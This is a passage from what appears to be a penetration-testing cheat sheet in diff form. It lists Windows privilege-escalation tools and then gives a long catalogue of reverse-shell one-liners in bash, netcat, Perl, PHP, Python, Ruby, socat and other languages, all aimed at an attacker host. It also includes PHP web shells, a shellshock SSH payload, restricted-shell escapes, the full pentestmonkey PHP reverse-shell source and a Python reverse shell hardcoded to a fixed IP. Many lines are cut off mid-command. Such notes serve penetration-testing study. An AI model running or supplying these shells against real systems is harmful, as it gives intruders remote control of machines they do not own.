+suite/tree/master/winPEAS ]
+Accesschk.exe 
+[https://github.com/jivoi/pentest/blob/master/post_win/accesschk_exe]
+PowerUp (https://github.com/PowerShellMaﬁa/PowerSploit/tree/master/Privesc)
+Seatbelt (https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)
+Other : Windows Exploit Suggester (https://github.com/AonCyberLabs/Windows-Exploit-
+Suggester)
+Metasploit :
+getsystem 
+run post/multi/recon/local_  exploit_  suggester 
+Resources :
+https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html
+https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%2
+0and%20Resources/Windows%20-%20Privilege%20Escalation.md
+https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/
+http://www.fuzzysecurity.com/tutorials/16.html
+https://book.hacktricks.xyz/windows/checklist-windows-privilege-escalation (Win 
+PrivEsc Checlist)
+https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/
+
+Linux Reverse Shells
+Awk
+awk 'BEGIN {s = "/inet/tcp/0/LHOST/LPORT"; while(42) { do{ printf "shell>" |
+Bash
+ 
+bash -i >& /dev/tcp/LHOST/LPORT 0>&1
+0<&196;exec 196<>/dev/tcp/LHOST/LPORT; sh <&196 >&196 2>&196
+exec 5<>/dev/tcp/LHOST/LPORT && while read line 0<&5; do $line 2>&5 >&5; don
+Java
+ 
+r = Runtime.getRuntime(); p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/LHO
+Javascript
+ 
+
+(function(){ var net = require("net"), cp = require("child_process"), sh = c
+Netcat
+ 
+nc -e /bin/sh LHOST LPORT
+/bin/sh | nc LHOST LPORT
+rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc LHOST LPORT >/tmp/f
+rm -f backpipe; mknod /tmp/backpipe p && /bin/sh 0</tmp/backpipe | nc LHOST 
+rm -f backpipe; mknod /tmp/backpipe p && nc LHOST LPORT 0<backpipe | /bin/ba
+Perl
+ 
+perl -e 'use Socket;$i="LHOST";$p=LPORT;socket(S,PF_INET,SOCK_STREAM,getprot
+perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"LPORT:LH
+
+# Windows
+1
+perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"LPORT:LHOST");STDIN->fdopen
+2
+PHP
+ 
+<?php system($_GET['cmd']);?>
+1
+2
+<?php echo "<pre>" . shell_exec($_GET["cmd"]) . "</pre>"; ?>
+3
+php -r '$sock=fsockopen("LHOST",LPORT);exec("/bin/sh -i <&3 >&3 2>&3");'
+php -r '$sock=fsockopen("LHOST",LPORT);shell_exec("/bin/sh -i <&3 >&3 2>&3")
+php -r '$sock=fsockopen("LHOST",LPORT);`/bin/sh -i <&3 >&3 2>&3`;'
+php -r '$sock=fsockopen("LHOST",LPORT);system("/bin/sh -i <&3 >&3 2>&3");'
+php -r '$sock=fsockopen("LHOST",LPORT);popen("/bin/sh -i <&3 >&3 2>&3", "r")
+// pentestmonkey one-liner ^_^
+1
+<?php set_time_limit (0); $VERSION = "1.0"; $ip = "LHOST"; $port = LPORT; $
+2
+ 
+
+Powershell
+$client = New-Object System.Net.Sockets.TCPClient('LHOST',LPORT); $stream = 
+Python
+ 
+# TCP
+1
+python -c "import os,pty,socket;s=socket.socket(socket.AF_INET,socket.SOCK_
+2
+# STCP
+1
+python -c "import os,pty,socket,sctp;s=sctp.sctpsocket_tcp(socket.AF_INET)
+2
+# UDP
+1
+python -c "import os,pty,socket;s=socket.socket(socket.AF_INET,socket.SOCK_
+2
+Ruby
+ 
+ruby -rsocket -e 'f=TCPSocket.open("LHOST",LPORT).to_i;exec sprintf("/bin/sh 
+ruby -rsocket -e 'exit if fork;c=TCPSocket.new("LHOST","LPORT");while(cmd=c.
+
+# Windows
+1
+ruby -rsocket -e 'c=TCPSocket.new("LHOST","LPORT");while(cmd=c.gets);IO.pop
+2
+Socat
+ 
+socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:LHOST:LPORT
+TCLsh
+ 
+echo 'set s [socket LHOST LPORT];while 42 { puts -nonewline $s "shell>";flus
+Telnet
+ 
+rm -f /tmp/p; mknod /tmp/p p && telnet LHOST LPORT 0/tmp/p
+telnet LHOST LPORT | /bin/bash | telnet LHOST LPORT
+xterm
+ 
+
+# Make sure the Xserver is listening to TCP.
+1
+xhost +RHOST
+2
+xterm -display LHOST:0 or DISPLAY=LHOST:0 xterm
+3
+Listeners
+ 
+socat file:`tty`,echo=0,raw tcp-listen:LPORT
+1
+nc -lvvp LPORT
+2
+
+Restricted Shell / SSH
+If reverse shell not working :
+try changing the port to 443 or 80
+try checking for characters breaking the reverse shell
+Evading Badchars in a reverse shell (HTB Sense)
+Echo abc
+Echo abc/
+Echo abc -
+Check env variables -> env
+HOME= /
+Echo ${HOME}/home
+Optional (Using ASCII to evade badchars)
+Printf “\55” -> -
+Restricted Reverse Shell : 
+To disable proﬁling in /etc/proﬁle and ~/.proﬁle
+Locate ifconﬁg
+/sbin/ifconﬁg
+nice /bin/bash
+SSH :
+// Ways to no profile
+1
+ssh hostname -t "bash --noprofile"
+2
+ssh -t user@host bash --norc --noprofile
+3
+ssh -t username@hostname /bin/sh
+4
+ssh -t user@host "bash --norc --noprofile -c '/bin/rm .bashrc'"
+5
+6
+// SSH bash shellshock (Troll2 Vulnhub)
+7
+ssh -i noob noob@192.168.0.119 '() { :; }; uname -a'
+8
+Bypass restricted shell using : (dipak.pdf)
+
+export PATH=/bin/:sbin/:/usr/bin/:$PATH 
+payload = "python -c 'import pty;pty.spawn(\"/bin/bash\")'"
+
+Stable Reverse Shells
+PHP
+<?php
+1
+// php-reverse-shell - A Reverse Shell implementation in PHP
+2
+// Copyright (C) 2007 pentestmonkey@pentestmonkey.net
+3
+//
+4
+// This tool may be used for legal purposes only.  Users take full responsi
+5
+// for any actions performed using this tool.  The author accepts no liabil
+6
+// for damage caused by this tool.  If these terms are not acceptable to yo
+7
+// do not use this tool.
+8
+//
+9
+// In all other respects the GPL version 2 applies:
+10
+//
+11
+// This program is free software; you can redistribute it and/or modify
+12
+// it under the terms of the GNU General Public License version 2 as
+13
+// published by the Free Software Foundation.
+14
+//
+15
+// This program is distributed in the hope that it will be useful,
+16
+// but WITHOUT ANY WARRANTY; without even the implied warranty of
+17
+// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+18
+// GNU General Public License for more details.
+19
+//
+20
+// You should have received a copy of the GNU General Public License along
+21
+// with this program; if not, write to the Free Software Foundation, Inc.,
+22
+// 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.
+23
+//
+24
+// This tool may be used for legal purposes only.  Users take full responsi
+25
+// for any actions performed using this tool.  If these terms are not accep
+26
+// you, then do not use this tool.
+27
+//
+28
+// You are encouraged to send comments, improvements or suggestions to
+29
+// me at pentestmonkey@pentestmonkey.net
+30
+//
+31
+// Description
+32
+// -----------
+33
+// This script will make an outbound TCP connection to a hardcoded IP and p
+34
+// The recipient will be given a shell running as the current user (apache 
+35
+//
+36
+// Limitations
+37
+// -----------
+38
+// proc_open and stream_set_blocking require PHP version 4.3+, or 5+
+39
+// Use of stream_select() on file descriptors returned by proc_open() will 
+40
+// Some compile-time options are needed for daemonisation (like pcntl, posi
+41
+//
+42
+// Usage
+43
+
+// -----
+44
+// See http://pentestmonkey.net/tools/php-reverse-shell if you get stuck.
+45
+46
+set_time_limit (0);
+47
+$VERSION = "1.0";
+48
+$ip = '127.0.0.1';  // CHANGE THIS
+49
+$port = 1234;       // CHANGE THIS
+50
+$chunk_size = 1400;
+51
+$write_a = null;
+52
+$error_a = null;
+53
+$shell = 'uname -a; w; id; /bin/sh -i';
+54
+$daemon = 0;
+55
+$debug = 0;
+56
+57
+//
+58
+// Daemonise ourself if possible to avoid zombies later
+59
+//
+60
+61
+// pcntl_fork is hardly ever available, but will allow us to daemonise
+62
+// our php process and avoid zombies.  Worth a try...
+63
+if (function_exists('pcntl_fork')) {
+64
+ // Fork and have the parent process exit
+65
+ $pid = pcntl_fork();
+66
+ 
+67
+ if ($pid == -1) {
+68
+  printit("ERROR: Can't fork");
+69
+  exit(1);
+70
+ }
+71
+ 
+72
+ if ($pid) {
+73
+  exit(0);  // Parent exits
+74
+ }
+75
+76
+ // Make the current process a session leader
+77
+ // Will only succeed if we forked
+78
+ if (posix_setsid() == -1) {
+79
+  printit("Error: Can't setsid()");
+80
+  exit(1);
+81
+ }
+82
+83
+ $daemon = 1;
+84
+} else {
+85
+ printit("WARNING: Failed to daemonise.  This is quite common and not fata
+86
+}
+87
+88
+// Change to a safe directory
+89
+chdir("/");
+90
+91
+// Remove any umask we inherited
+92
+umask(0);
+93
+94
+
+//
+95
+// Do the reverse shell...
+96
+//
+97
+98
+// Open reverse connection
+99
+$sock = fsockopen($ip, $port, $errno, $errstr, 30);
+100
+if (!$sock) {
+101
+ printit("$errstr ($errno)");
+102
+ exit(1);
+103
+}
+104
+105
+// Spawn shell process
+106
+$descriptorspec = array(
+107
+   0 => array("pipe", "r"),  // stdin is a pipe that the child will read fr
+108
+   1 => array("pipe", "w"),  // stdout is a pipe that the child will write 
+109
+   2 => array("pipe", "w")   // stderr is a pipe that the child will write 
+110
+);
+111
+112
+$process = proc_open($shell, $descriptorspec, $pipes);
+113
+114
+if (!is_resource($process)) {
+115
+ printit("ERROR: Can't spawn shell");
+116
+ exit(1);
+117
+}
+118
+119
+// Set everything to non-blocking
+120
+// Reason: Occsionally reads will block, even though stream_select tells us
+121
+stream_set_blocking($pipes[0], 0);
+122
+stream_set_blocking($pipes[1], 0);
+123
+stream_set_blocking($pipes[2], 0);
+124
+stream_set_blocking($sock, 0);
+125
+126
+printit("Successfully opened reverse shell to $ip:$port");
+127
+128
+while (1) {
+129
+ // Check for end of TCP connection
+130
+ if (feof($sock)) {
+131
+  printit("ERROR: Shell connection terminated");
+132
+  break;
+133
+ }
+134
+135
+ // Check for end of STDOUT
+136
+ if (feof($pipes[1])) {
+137
+  printit("ERROR: Shell process terminated");
+138
+  break;
+139
+ }
+140
+141
+ // Wait until a command is end down $sock, or some
+142
+ // command output is available on STDOUT or STDERR
+143
+ $read_a = array($sock, $pipes[1], $pipes[2]);
+144
+ $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);
+145
+
+146
+ // If we can read from the TCP socket, send
+147
+ // data to process's STDIN
+148
+ if (in_array($sock, $read_a)) {
+149
+  if ($debug) printit("SOCK READ");
+150
+  $input = fread($sock, $chunk_size);
+151
+  if ($debug) printit("SOCK: $input");
+152
+  fwrite($pipes[0], $input);
+153
+ }
+154
+155
+ // If we can read from the process's STDOUT
+156
+ // send data down tcp connection
+157
+ if (in_array($pipes[1], $read_a)) {
+158
+  if ($debug) printit("STDOUT READ");
+159
+  $input = fread($pipes[1], $chunk_size);
+160
+  if ($debug) printit("STDOUT: $input");
+161
+  fwrite($sock, $input);
+162
+ }
+163
+164
+ // If we can read from the process's STDERR
+165
+ // send data down tcp connection
+166
+ if (in_array($pipes[2], $read_a)) {
+167
+  if ($debug) printit("STDERR READ");
+168
+  $input = fread($pipes[2], $chunk_size);
+169
+  if ($debug) printit("STDERR: $input");
+170
+  fwrite($sock, $input);
+171
+ }
+172
+}
+173
+174
+fclose($sock);
+175
+fclose($pipes[0]);
+176
+fclose($pipes[1]);
+177
+fclose($pipes[2]);
+178
+proc_close($process);
+179
+180
+// Like print, but does nothing if we've daemonised ourself
+181
+// (I can't figure out how to redirect STDOUT like a proper daemon)
+182
+function printit ($string) {
+183
+ if (!$daemon) {
+184
+  print "$string\n";
+185
+ }
+186
+}
+187
+188
+?> 
+189
+190
+191
+192
+Python
+
+import socket,subprocess,os
+1
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+2
+s.connect(("192.168.0.110",4444))
+3
+os.dup2(s.fileno(),0) 
+4
+os.dup2(s.fileno(),1)
+5
+os.dup2(s.fileno(),2)
+6
+p=subprocess.call(["/bin/sh","-i"])
+7
+8
+
+Spawn TTY
+Bash
+/bin/bash -i
+1
+echo os.system('/bin/bash')
+2
+/bin/sh -i
+3
+Python
+python -c "import pty; pty.spawn('/bin/bash')"
+Perl
+perl -e 'exec "/bin/bash";'
+Socat
+On the attacker machine, set up socat listener: replace 4444 with your listening port.
+socat -,raw,echo=0 tcp-listen:4444
+On the victim machine, connect back the attacker machine and spawn a shell. Replace 
+<host>  with attacker IP and <port>  with attacker listing port.
+$ socat exec:"/bin/bash -li",pty,stderr,setsid,sigint,sane tcp:<host>:<port>
